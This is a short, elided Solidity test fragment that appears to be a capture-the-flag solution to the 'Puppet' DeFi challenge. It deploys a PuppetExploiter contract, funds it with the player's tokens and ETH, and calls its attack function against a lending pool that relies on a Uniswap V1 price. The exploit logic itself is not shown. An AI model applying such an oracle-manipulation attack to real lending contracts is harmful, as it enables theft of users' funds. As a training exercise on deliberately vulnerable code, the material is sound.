...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        ...
        PuppetExploiter exploiter = new PuppetExploiter(uniswapV1Exchange, token, lendingPool, recovery);

        // 2. Transfer the DVT to the contract
        token.transfer(address(exploiter), PLAYER_INITIAL_TOKEN_BALANCE);

        // 3. Attack
        exploiter.attack{value: PLAYER_INITIAL_ETH_BALANCE}(POOL_INITIAL_TOKEN_BALANCE);
    }
